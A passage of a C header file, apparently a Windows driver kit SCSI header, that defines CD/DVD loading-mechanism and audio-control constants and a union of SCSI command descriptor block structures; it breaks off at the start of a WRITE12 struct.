#define CDDA_CHANNEL_THREE      0x8

#define CDVD_LMT_CADDY              0
#define CDVD_LMT_TRAY               1
#define CDVD_LMT_POPUP              2
#define CDVD_LMT_RESERVED1          3
#define CDVD_LMT_CHANGER_INDIVIDUAL 4
#define CDVD_LMT_CHANGER_CARTRIDGE  5
#define CDVD_LMT_RESERVED2          6
#define CDVD_LMT_RESERVED3          7

#define LOADING_MECHANISM_CADDY                 0x00
#define LOADING_MECHANISM_TRAY                  0x01
#define LOADING_MECHANISM_POPUP                 0x02
#define LOADING_MECHANISM_INDIVIDUAL_CHANGER    0x04
#define LOADING_MECHANISM_CARTRIDGE_CHANGER     0x05

#define MODE_BLOCK_DESC_LENGTH        8
#define MODE_HEADER_LENGTH            4
#define MODE_HEADER_LENGTH10          8

/* CDROM audio control */
#define CDB_AUDIO_PAUSE                   0x00
#define CDB_AUDIO_RESUME                  0x01
#define CDB_DEVICE_START                  0x11
#define CDB_DEVICE_STOP                   0x10
#define CDB_EJECT_MEDIA                   0x10
#define CDB_LOAD_MEDIA                    0x01
#define CDB_SUBCHANNEL_HEADER             0x00
#define CDB_SUBCHANNEL_BLOCK              0x01

#define CDROM_AUDIO_CONTROL_PAGE          0x0E
#define MODE_SELECT_IMMEDIATE             0x04
#define MODE_SELECT_PFBIT                 0x10

#define CDB_USE_MSF                       0x01

/* Multisession CDROMs */
#define GET_LAST_SESSION 0x01
#define GET_SESSION_DATA 0x02

typedef union _CDB {
  struct _CDB6GENERIC {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR CommandUniqueBits:4;
    UCHAR LogicalUnitNumber:3;
    UCHAR CommandUniqueBytes[3];
    UCHAR Link:1;
    UCHAR Flag:1;
    UCHAR Reserved:4;
    UCHAR VendorUnique:2;
  } CDB6GENERIC;
  struct _CDB6READWRITE {
    UCHAR OperationCode;
    UCHAR LogicalBlockMsb1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR LogicalBlockMsb0;
    UCHAR LogicalBlockLsb;
    UCHAR TransferBlocks;
    UCHAR Control;
  } CDB6READWRITE;
  struct _CDB6INQUIRY {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR PageCode;
    UCHAR IReserved;
    UCHAR AllocationLength;
    UCHAR Control;
  } CDB6INQUIRY;
  struct _CDB6INQUIRY3 {
    UCHAR OperationCode;
    UCHAR EnableVitalProductData:1;
    UCHAR CommandSupportData:1;
    UCHAR Reserved1:6;
    UCHAR PageCode;
    UCHAR Reserved2;
    UCHAR AllocationLength;
    UCHAR Control;
  } CDB6INQUIRY3;
  struct _CDB6VERIFY {
    UCHAR OperationCode;
    UCHAR Fixed:1;
    UCHAR ByteCompare:1;
    UCHAR Immediate:1;
    UCHAR Reserved:2;
    UCHAR LogicalUnitNumber:3;
    UCHAR VerificationLength[3];
    UCHAR Control;
  } CDB6VERIFY;
  struct _RECEIVE_DIAGNOSTIC {
    UCHAR OperationCode;
    UCHAR PageCodeValid:1;
    UCHAR Reserved:7;
    UCHAR PageCode;
    UCHAR AllocationLength[2];
    UCHAR Control;
  } RECEIVE_DIAGNOSTIC;
  struct _SEND_DIAGNOSTIC {
    UCHAR OperationCode;
    UCHAR UnitOffline:1;
    UCHAR DeviceOffline:1;
    UCHAR SelfTest:1;
    UCHAR Reserved1:1;
    UCHAR PageFormat:1;
    UCHAR SelfTestCode:3;
    UCHAR Reserved2;
    UCHAR ParameterListLength[2];
    UCHAR Control;
  } SEND_DIAGNOSTIC;
  struct _CDB6FORMAT {
    UCHAR OperationCode;
    UCHAR FormatControl:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR FReserved1;
    UCHAR InterleaveMsb;
    UCHAR InterleaveLsb;
    UCHAR FReserved2;
  } CDB6FORMAT;
  struct _CDB10 {
    UCHAR OperationCode;
    UCHAR RelativeAddress:1;
    UCHAR Reserved1:2;
    UCHAR ForceUnitAccess:1;
    UCHAR DisablePageOut:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR LogicalBlockByte0;
    UCHAR LogicalBlockByte1;
    UCHAR LogicalBlockByte2;
    UCHAR LogicalBlockByte3;
    UCHAR Reserved2;
    UCHAR TransferBlocksMsb;
    UCHAR TransferBlocksLsb;
    UCHAR Control;
  } CDB10;
  struct _CDB12 {
    UCHAR OperationCode;
    UCHAR RelativeAddress:1;
    UCHAR Reserved1:2;
    UCHAR ForceUnitAccess:1;
    UCHAR DisablePageOut:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR LogicalBlock[4];
    UCHAR TransferLength[4];
    UCHAR Reserved2;
    UCHAR Control;
  } CDB12;
  struct _CDB16 {
     UCHAR OperationCode;
     UCHAR Reserved1:3;
     UCHAR ForceUnitAccess:1;
     UCHAR DisablePageOut:1;
     UCHAR Protection:3;
     UCHAR LogicalBlock[8];
     UCHAR TransferLength[4];
     UCHAR Reserved2;
     UCHAR Control;
  } CDB16;
  struct _READ_BUFFER_10 {
    UCHAR OperationCode;
    UCHAR Mode:5;
    UCHAR ModeSpecific:3;
    UCHAR BufferId;
    UCHAR BufferOffset[3];
    UCHAR AllocationLength[3];
    UCHAR Control;
  } READ_BUFFER_10;
  struct _READ_BUFFER_16 {
    UCHAR OperationCode;
    UCHAR Mode:5;
    UCHAR ModeSpecific:3;
    UCHAR BufferOffset[8];
    UCHAR AllocationLength[4];
    UCHAR BufferId;
    UCHAR Control;
  } READ_BUFFER_16;
  struct _SECURITY_PROTOCOL_IN {
    UCHAR OperationCode;
    UCHAR SecurityProtocol;
    UCHAR SecurityProtocolSpecific[2];
    UCHAR Reserved1:7;
    UCHAR INC_512:1;
    UCHAR Reserved2;
    UCHAR AllocationLength[4];
    UCHAR Reserved3;
    UCHAR Control;
  } SECURITY_PROTOCOL_IN;
  struct _SECURITY_PROTOCOL_OUT {
    UCHAR OperationCode;
    UCHAR SecurityProtocol;
    UCHAR SecurityProtocolSpecific[2];
    UCHAR Reserved1:7;
    UCHAR INC_512:1;
    UCHAR Reserved2;
    UCHAR AllocationLength[4];
    UCHAR Reserved3;
    UCHAR Control;
  } SECURITY_PROTOCOL_OUT;
  struct _UNMAP {
    UCHAR OperationCode;
    UCHAR Anchor:1;
    UCHAR Reserved1:7;
    UCHAR Reserved2[4];
    UCHAR GroupNumber:5;
    UCHAR Reserved3:3;
    UCHAR AllocationLength[2];
    UCHAR Control;
  } UNMAP;
  struct _SANITIZE {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR AUSE:1;
    UCHAR Reserved1:1;
    UCHAR Immediate:1;
    UCHAR Reserved2[5];
    UCHAR ParameterListLength[2];
    UCHAR Control;
  } SANITIZE;
  struct _PAUSE_RESUME {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2[6];
    UCHAR Action;
    UCHAR Control;
  } PAUSE_RESUME;
  struct _READ_TOC {
    UCHAR OperationCode;
    UCHAR Reserved0:1;
    UCHAR Msf:1;
    UCHAR Reserved1:3;
    UCHAR LogicalUnitNumber:3;
    UCHAR Format2:4;
    UCHAR Reserved2:4;
    UCHAR Reserved3[3];
    UCHAR StartingTrack;
    UCHAR AllocationLength[2];
    UCHAR Control:6;
    UCHAR Format:2;
  } READ_TOC;
  struct _READ_DISK_INFORMATION {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR Reserved2[5];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } READ_DISK_INFORMATION;
  struct _READ_TRACK_INFORMATION {
    UCHAR OperationCode;
    UCHAR Track:2;
    UCHAR Reserved4:3;
    UCHAR Lun:3;
    UCHAR BlockAddress[4];
    UCHAR Reserved3;
    UCHAR AllocationLength[2];
    UCHAR Control;
  } READ_TRACK_INFORMATION;
  struct _RESERVE_TRACK_RZONE {
    UCHAR OperationCode;
    UCHAR Reserved1[4];
    UCHAR ReservationSize[4];
    UCHAR Control;
  } RESERVE_TRACK_RZONE;
  struct _SEND_OPC_INFORMATION {
    UCHAR OperationCode;
    UCHAR DoOpc:1;
    UCHAR Reserved1:7;
    UCHAR Exclude0:1;
    UCHAR Exclude1:1;
    UCHAR Reserved2:6;
    UCHAR Reserved3[4];
    UCHAR ParameterListLength[2];
    UCHAR Reserved4;
  } SEND_OPC_INFORMATION;
  struct _REPAIR_TRACK {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR Reserved1:7;
    UCHAR Reserved2[2];
    UCHAR TrackNumber[2];
    UCHAR Reserved3[3];
    UCHAR Control;
  } REPAIR_TRACK;
  struct _CLOSE_TRACK {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR Reserved1:7;
    UCHAR Track:1;
    UCHAR Session:1;
    UCHAR Reserved2:6;
    UCHAR Reserved3;
    UCHAR TrackNumber[2];
    UCHAR Reserved4[3];
    UCHAR Control;
  } CLOSE_TRACK;
  struct _READ_BUFFER_CAPACITY {
    UCHAR OperationCode;
    UCHAR BlockInfo:1;
    UCHAR Reserved1:7;
    UCHAR Reserved2[5];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } READ_BUFFER_CAPACITY;
  struct _SEND_CUE_SHEET {
    UCHAR OperationCode;
    UCHAR Reserved[5];
    UCHAR CueSheetSize[3];
    UCHAR Control;
  } SEND_CUE_SHEET;
  struct _READ_HEADER {
    UCHAR OperationCode;
    UCHAR Reserved1:1;
    UCHAR Msf:1;
    UCHAR Reserved2:3;
    UCHAR Lun:3;
    UCHAR LogicalBlockAddress[4];
    UCHAR Reserved3;
    UCHAR AllocationLength[2];
    UCHAR Control;
  } READ_HEADER;
  struct _PLAY_AUDIO {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR StartingBlockAddress[4];
    UCHAR Reserved2;
    UCHAR PlayLength[2];
    UCHAR Control;
  } PLAY_AUDIO;
  struct _PLAY_AUDIO_MSF {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2;
    UCHAR StartingM;
    UCHAR StartingS;
    UCHAR StartingF;
    UCHAR EndingM;
    UCHAR EndingS;
    UCHAR EndingF;
    UCHAR Control;
  } PLAY_AUDIO_MSF;
  struct _BLANK_MEDIA {
    UCHAR OperationCode;
    UCHAR BlankType:3;
    UCHAR Reserved1:1;
    UCHAR Immediate:1;
    UCHAR Reserved2:3;
    UCHAR AddressOrTrack[4];
    UCHAR Reserved3[5];
    UCHAR Control;
  } BLANK_MEDIA;
  struct _PLAY_CD {
    UCHAR OperationCode;
    UCHAR Reserved1:1;
    UCHAR CMSF:1;
    UCHAR ExpectedSectorType:3;
    UCHAR Lun:3;
    _ANONYMOUS_UNION union {
      struct {
        UCHAR StartingBlockAddress[4];
        UCHAR PlayLength[4];
      } LBA;
      struct {
        UCHAR Reserved1;
        UCHAR StartingM;
        UCHAR StartingS;
        UCHAR StartingF;
        UCHAR EndingM;
        UCHAR EndingS;
        UCHAR EndingF;
        UCHAR Reserved2;
      } MSF;
    };
    UCHAR Audio:1;
    UCHAR Composite:1;
    UCHAR Port1:1;
    UCHAR Port2:1;
    UCHAR Reserved2:3;
    UCHAR Speed:1;
    UCHAR Control;
  } PLAY_CD;
  struct _SCAN_CD {
    UCHAR OperationCode;
    UCHAR RelativeAddress:1;
    UCHAR Reserved1:3;
    UCHAR Direct:1;
    UCHAR Lun:3;
    UCHAR StartingAddress[4];
    UCHAR Reserved2[3];
    UCHAR Reserved3:6;
    UCHAR Type:2;
    UCHAR Reserved4;
    UCHAR Control;
  } SCAN_CD;
  struct _STOP_PLAY_SCAN {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR Reserved2[7];
    UCHAR Control;
  } STOP_PLAY_SCAN;
  struct _SUBCHANNEL {
    UCHAR OperationCode;
    UCHAR Reserved0:1;
    UCHAR Msf:1;
    UCHAR Reserved1:3;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2:6;
    UCHAR SubQ:1;
    UCHAR Reserved3:1;
    UCHAR Format;
    UCHAR Reserved4[2];
    UCHAR TrackNumber;
    UCHAR AllocationLength[2];
    UCHAR Control;
  } SUBCHANNEL;
  struct _READ_CD {
    UCHAR OperationCode;
    UCHAR RelativeAddress:1;
    UCHAR Reserved0:1;
    UCHAR ExpectedSectorType:3;
    UCHAR Lun:3;
    UCHAR StartingLBA[4];
    UCHAR TransferBlocks[3];
    UCHAR Reserved2:1;
    UCHAR ErrorFlags:2;
    UCHAR IncludeEDC:1;
    UCHAR IncludeUserData:1;
    UCHAR HeaderCode:2;
    UCHAR IncludeSyncData:1;
    UCHAR SubChannelSelection:3;
    UCHAR Reserved3:5;
    UCHAR Control;
  } READ_CD;
  struct _READ_CD_MSF {
    UCHAR OperationCode;
    UCHAR RelativeAddress:1;
    UCHAR Reserved1:1;
    UCHAR ExpectedSectorType:3;
    UCHAR Lun:3;
    UCHAR Reserved2;
    UCHAR StartingM;
    UCHAR StartingS;
    UCHAR StartingF;
    UCHAR EndingM;
    UCHAR EndingS;
    UCHAR EndingF;
    UCHAR Reserved3;
    UCHAR Reserved4:1;
    UCHAR ErrorFlags:2;
    UCHAR IncludeEDC:1;
    UCHAR IncludeUserData:1;
    UCHAR HeaderCode:2;
    UCHAR IncludeSyncData:1;
    UCHAR SubChannelSelection:3;
    UCHAR Reserved5:5;
    UCHAR Control;
  } READ_CD_MSF;
  struct _PLXTR_READ_CDDA {
    UCHAR OperationCode;
    UCHAR Reserved0:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR LogicalBlockByte0;
    UCHAR LogicalBlockByte1;
    UCHAR LogicalBlockByte2;
    UCHAR LogicalBlockByte3;
    UCHAR TransferBlockByte0;
    UCHAR TransferBlockByte1;
    UCHAR TransferBlockByte2;
    UCHAR TransferBlockByte3;
    UCHAR SubCode;
    UCHAR Control;
  } PLXTR_READ_CDDA;
  struct _NEC_READ_CDDA {
    UCHAR OperationCode;
    UCHAR Reserved0;
    UCHAR LogicalBlockByte0;
    UCHAR LogicalBlockByte1;
    UCHAR LogicalBlockByte2;
    UCHAR LogicalBlockByte3;
    UCHAR Reserved1;
    UCHAR TransferBlockByte0;
    UCHAR TransferBlockByte1;
    UCHAR Control;
  } NEC_READ_CDDA;
#if NTDDI_VERSION >= NTDDI_WIN8
  struct _MODE_SENSE {
    UCHAR OperationCode;
    UCHAR Reserved1:3;
    UCHAR Dbd:1;
    UCHAR Reserved2:4;
    UCHAR PageCode:6;
    UCHAR Pc:2;
    UCHAR SubPageCode;
    UCHAR AllocationLength;
    UCHAR Control;
  } MODE_SENSE;
  struct _MODE_SENSE10 {
    UCHAR OperationCode;
    UCHAR Reserved1:3;
    UCHAR Dbd:1;
    UCHAR LongLBAAccepted:1;
    UCHAR Reserved2:3;
    UCHAR PageCode:6;
    UCHAR Pc:2;
    UCHAR SubPageCode;
    UCHAR Reserved3[3];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } MODE_SENSE10;
#else
    struct _MODE_SENSE {
    UCHAR OperationCode;
    UCHAR Reserved1:3;
    UCHAR Dbd:1;
    UCHAR Reserved2:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR PageCode:6;
    UCHAR Pc:2;
    UCHAR Reserved3;
    UCHAR AllocationLength;
    UCHAR Control;
  } MODE_SENSE;
  struct _MODE_SENSE10 {
    UCHAR OperationCode;
    UCHAR Reserved1:3;
    UCHAR Dbd:1;
    UCHAR Reserved2:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR PageCode:6;
    UCHAR Pc:2;
    UCHAR Reserved3[4];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } MODE_SENSE10;
#endif /* NTDDI_VERSION >= NTDDI_WIN8 */
  struct _MODE_SELECT {
    UCHAR OperationCode;
    UCHAR SPBit:1;
    UCHAR Reserved1:3;
    UCHAR PFBit:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2[2];
    UCHAR ParameterListLength;
    UCHAR Control;
  } MODE_SELECT;
  struct _MODE_SELECT10 {
    UCHAR OperationCode;
    UCHAR SPBit:1;
    UCHAR Reserved1:3;
    UCHAR PFBit:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2[5];
    UCHAR ParameterListLength[2];
    UCHAR Control;
  } MODE_SELECT10;
  struct _LOCATE {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR CPBit:1;
    UCHAR BTBit:1;
    UCHAR Reserved1:2;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved3;
    UCHAR LogicalBlockAddress[4];
    UCHAR Reserved4;
    UCHAR Partition;
    UCHAR Control;
  } LOCATE;
  struct _LOGSENSE {
    UCHAR OperationCode;
    UCHAR SPBit:1;
    UCHAR PPCBit:1;
    UCHAR Reserved1:3;
    UCHAR LogicalUnitNumber:3;
    UCHAR PageCode:6;
    UCHAR PCBit:2;
    _ANONYMOUS_UNION union {
      UCHAR SubPageCode;
      UCHAR Reserved2;
    };
    UCHAR Reserved3;
    UCHAR ParameterPointer[2];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } LOGSENSE;
  struct _LOGSELECT {
    UCHAR OperationCode;
    UCHAR SPBit:1;
    UCHAR PCRBit:1;
    UCHAR Reserved1:3;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved:6;
    UCHAR PCBit:2;
    UCHAR Reserved2[4];
    UCHAR ParameterListLength[2];
    UCHAR Control;
  } LOGSELECT;
  struct _PRINT {
    UCHAR OperationCode;
    UCHAR Reserved:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR TransferLength[3];
    UCHAR Control;
  } PRINT;
  struct _SEEK {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR LogicalBlockAddress[4];
    UCHAR Reserved2[3];
    UCHAR Control;
  } SEEK;
  struct _ERASE {
    UCHAR OperationCode;
    UCHAR Long:1;
    UCHAR Immediate:1;
    UCHAR Reserved1:3;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2[3];
    UCHAR Control;
  } ERASE;
  struct _START_STOP {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR Reserved1:4;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2[2];
    UCHAR Start:1;
    UCHAR LoadEject:1;
    UCHAR Reserved3:6;
    UCHAR Control;
  } START_STOP;
  struct _MEDIA_REMOVAL {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR Reserved2[2];
    UCHAR Prevent:1;
    UCHAR Persistant:1;
    UCHAR Reserved3:6;
    UCHAR Control;
  } MEDIA_REMOVAL;
  struct _SEEK_BLOCK {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR Reserved1:7;
    UCHAR BlockAddress[3];
    UCHAR Link:1;
    UCHAR Flag:1;
    UCHAR Reserved2:4;
    UCHAR VendorUnique:2;
  } SEEK_BLOCK;
  struct _REQUEST_BLOCK_ADDRESS {
    UCHAR OperationCode;
    UCHAR Reserved1[3];
    UCHAR AllocationLength;
    UCHAR Link:1;
    UCHAR Flag:1;
    UCHAR Reserved2:4;
    UCHAR VendorUnique:2;
  } REQUEST_BLOCK_ADDRESS;
  struct _PARTITION {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR Sel:1;
    UCHAR PartitionSelect:6;
    UCHAR Reserved1[3];
    UCHAR Control;
  } PARTITION;
  struct _WRITE_TAPE_MARKS {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR WriteSetMarks:1;
    UCHAR Reserved:3;
    UCHAR LogicalUnitNumber:3;
    UCHAR TransferLength[3];
    UCHAR Control;
  } WRITE_TAPE_MARKS;
  struct _SPACE_TAPE_MARKS {
    UCHAR OperationCode;
    UCHAR Code:3;
    UCHAR Reserved:2;
    UCHAR LogicalUnitNumber:3;
    UCHAR NumMarksMSB;
    UCHAR NumMarks;
    UCHAR NumMarksLSB;
  union {
    UCHAR value;
    struct {
      UCHAR Link:1;
      UCHAR Flag:1;
      UCHAR Reserved:4;
      UCHAR VendorUnique:2;
    } Fields;
  } Byte6;
  } SPACE_TAPE_MARKS;
  struct _READ_POSITION {
    UCHAR Operation;
    UCHAR BlockType:1;
    UCHAR Reserved1:4;
    UCHAR Lun:3;
    UCHAR Reserved2[7];
    UCHAR Control;
  } READ_POSITION;
  struct _CDB6READWRITETAPE {
    UCHAR OperationCode;
    UCHAR VendorSpecific:5;
    UCHAR Reserved:3;
    UCHAR TransferLenMSB;
    UCHAR TransferLen;
    UCHAR TransferLenLSB;
    UCHAR Link:1;
    UCHAR Flag:1;
    UCHAR Reserved1:4;
    UCHAR VendorUnique:2;
  } CDB6READWRITETAPE;
  struct _INIT_ELEMENT_STATUS {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNubmer:3;
    UCHAR Reserved2[3];
    UCHAR Reserved3:7;
    UCHAR NoBarCode:1;
  } INIT_ELEMENT_STATUS;
  struct _INITIALIZE_ELEMENT_RANGE {
    UCHAR OperationCode;
    UCHAR Range:1;
    UCHAR Reserved1:4;
    UCHAR LogicalUnitNubmer:3;
    UCHAR FirstElementAddress[2];
    UCHAR Reserved2[2];
    UCHAR NumberOfElements[2];
    UCHAR Reserved3;
    UCHAR Reserved4:7;
    UCHAR NoBarCode:1;
  } INITIALIZE_ELEMENT_RANGE;
  struct _POSITION_TO_ELEMENT {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR TransportElementAddress[2];
    UCHAR DestinationElementAddress[2];
    UCHAR Reserved2[2];
    UCHAR Flip:1;
    UCHAR Reserved3:7;
    UCHAR Control;
  } POSITION_TO_ELEMENT;
  struct _MOVE_MEDIUM {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR TransportElementAddress[2];
    UCHAR SourceElementAddress[2];
    UCHAR DestinationElementAddress[2];
    UCHAR Reserved2[2];
    UCHAR Flip:1;
    UCHAR Reserved3:7;
    UCHAR Control;
  } MOVE_MEDIUM;
  struct _EXCHANGE_MEDIUM {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR LogicalUnitNumber:3;
    UCHAR TransportElementAddress[2];
    UCHAR SourceElementAddress[2];
    UCHAR Destination1ElementAddress[2];
    UCHAR Destination2ElementAddress[2];
    UCHAR Flip1:1;
    UCHAR Flip2:1;
    UCHAR Reserved3:6;
    UCHAR Control;
  } EXCHANGE_MEDIUM;
  struct _READ_ELEMENT_STATUS {
    UCHAR OperationCode;
    UCHAR ElementType:4;
    UCHAR VolTag:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR StartingElementAddress[2];
    UCHAR NumberOfElements[2];
    UCHAR Reserved1;
    UCHAR AllocationLength[3];
    UCHAR Reserved2;
    UCHAR Control;
  } READ_ELEMENT_STATUS;
  struct _SEND_VOLUME_TAG {
    UCHAR OperationCode;
    UCHAR ElementType:4;
    UCHAR Reserved1:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR StartingElementAddress[2];
    UCHAR Reserved2;
    UCHAR ActionCode:5;
    UCHAR Reserved3:3;
    UCHAR Reserved4[2];
    UCHAR ParameterListLength[2];
    UCHAR Reserved5;
    UCHAR Control;
  } SEND_VOLUME_TAG;
  struct _REQUEST_VOLUME_ELEMENT_ADDRESS {
    UCHAR OperationCode;
    UCHAR ElementType:4;
    UCHAR VolTag:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR StartingElementAddress[2];
    UCHAR NumberElements[2];
    UCHAR Reserved1;
    UCHAR AllocationLength[3];
    UCHAR Reserved2;
    UCHAR Control;
  } REQUEST_VOLUME_ELEMENT_ADDRESS;
  struct _LOAD_UNLOAD {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR Reserved1:4;
    UCHAR Lun:3;
    UCHAR Reserved2[2];
    UCHAR Start:1;
    UCHAR LoadEject:1;
    UCHAR Reserved3:6;
    UCHAR Reserved4[3];
    UCHAR Slot;
    UCHAR Reserved5[3];
  } LOAD_UNLOAD;
  struct _MECH_STATUS {
    UCHAR OperationCode;
    UCHAR Reserved:5;
    UCHAR Lun:3;
    UCHAR Reserved1[6];
    UCHAR AllocationLength[2];
    UCHAR Reserved2[1];
    UCHAR Control;
  } MECH_STATUS;
  struct _SYNCHRONIZE_CACHE10 {
    UCHAR OperationCode;
    UCHAR RelAddr:1;
    UCHAR Immediate:1;
    UCHAR Reserved:3;
    UCHAR Lun:3;
    UCHAR LogicalBlockAddress[4];
    UCHAR Reserved2;
    UCHAR BlockCount[2];
    UCHAR Control;
  } SYNCHRONIZE_CACHE10;
  struct _GET_EVENT_STATUS_NOTIFICATION {
    UCHAR OperationCode;
    UCHAR Immediate:1;
    UCHAR Reserved:4;
    UCHAR Lun:3;
    UCHAR Reserved2[2];
    UCHAR NotificationClassRequest;
    UCHAR Reserved3[2];
    UCHAR EventListLength[2];
    UCHAR Control;
  } GET_EVENT_STATUS_NOTIFICATION;
  struct _GET_PERFORMANCE {
    UCHAR OperationCode;
    UCHAR Except:2;
    UCHAR Write:1;
    UCHAR Tolerance:2;
    UCHAR Reserved0:3;
    UCHAR StartingLBA[4];
    UCHAR Reserved1[2];
    UCHAR MaximumNumberOfDescriptors[2];
    UCHAR Type;
    UCHAR Control;
  } GET_PERFORMANCE;
  struct _READ_DVD_STRUCTURE {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR RMDBlockNumber[4];
    UCHAR LayerNumber;
    UCHAR Format;
    UCHAR AllocationLength[2];
    UCHAR Reserved3:6;
    UCHAR AGID:2;
    UCHAR Control;
  } READ_DVD_STRUCTURE;
  struct _SET_STREAMING {
    UCHAR OperationCode;
    UCHAR Reserved[8];
    UCHAR ParameterListLength[2];
    UCHAR Control;
  } SET_STREAMING;
  struct _SEND_DVD_STRUCTURE {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR Reserved2[5];
    UCHAR Format;
    UCHAR ParameterListLength[2];
    UCHAR Reserved3;
    UCHAR Control;
  } SEND_DVD_STRUCTURE;
  struct _SEND_KEY {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR Reserved2[6];
    UCHAR ParameterListLength[2];
    UCHAR KeyFormat:6;
    UCHAR AGID:2;
    UCHAR Control;
  } SEND_KEY;
  struct _REPORT_KEY {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR LogicalBlockAddress[4];
    UCHAR Reserved2[2];
    UCHAR AllocationLength[2];
    UCHAR KeyFormat:6;
    UCHAR AGID:2;
    UCHAR Control;
  } REPORT_KEY;
  struct _SET_READ_AHEAD {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR TriggerLBA[4];
    UCHAR ReadAheadLBA[4];
    UCHAR Reserved2;
    UCHAR Control;
  } SET_READ_AHEAD;
  struct _READ_FORMATTED_CAPACITIES {
    UCHAR OperationCode;
    UCHAR Reserved1:5;
    UCHAR Lun:3;
    UCHAR Reserved2[5];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } READ_FORMATTED_CAPACITIES;
  struct _REPORT_LUNS {
    UCHAR OperationCode;
    UCHAR Reserved1[5];
    UCHAR AllocationLength[4];
    UCHAR Reserved2[1];
    UCHAR Control;
  } REPORT_LUNS;
  struct _PERSISTENT_RESERVE_IN {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR Reserved2[5];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } PERSISTENT_RESERVE_IN;
  struct _PERSISTENT_RESERVE_OUT {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR Type:4;
    UCHAR Scope:4;
    UCHAR Reserved2[4];
    UCHAR ParameterListLength[2];
    UCHAR Control;
  } PERSISTENT_RESERVE_OUT;
  struct _REPORT_TIMESTAMP {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR Reserved2[4];
    UCHAR AllocationLength[4];
    UCHAR Reserved3;
    UCHAR Control;
  } REPORT_TIMESTAMP;
  struct _SET_TIMESTAMP {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR Reserved2[4];
    UCHAR ParameterListLength[4];
    UCHAR Reserved3;
    UCHAR Control;
  } SET_TIMESTAMP;
  struct _GET_CONFIGURATION {
    UCHAR OperationCode;
    UCHAR RequestType:2;
    UCHAR Reserved1:6;
    UCHAR StartingFeature[2];
    UCHAR Reserved2[3];
    UCHAR AllocationLength[2];
    UCHAR Control;
  } GET_CONFIGURATION;
  struct _SET_CD_SPEED {
    UCHAR OperationCode;
    _ANONYMOUS_UNION union {
      UCHAR Reserved1;
      _ANONYMOUS_STRUCT struct {
        UCHAR RotationControl:2;
        UCHAR Reserved3:6;
      } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
    UCHAR ReadSpeed[2];
    UCHAR WriteSpeed[2];
    UCHAR Reserved2[5];
    UCHAR Control;
  } SET_CD_SPEED;
  struct _READ12 {
    UCHAR OperationCode;
    UCHAR RelativeAddress:1;
    UCHAR Reserved1:2;
    UCHAR ForceUnitAccess:1;
    UCHAR DisablePageOut:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR LogicalBlock[4];
    UCHAR TransferLength[4];
    UCHAR Reserved2:7;
    UCHAR Streaming:1;
    UCHAR Control;
  } READ12;
  struct _WRITE12 {
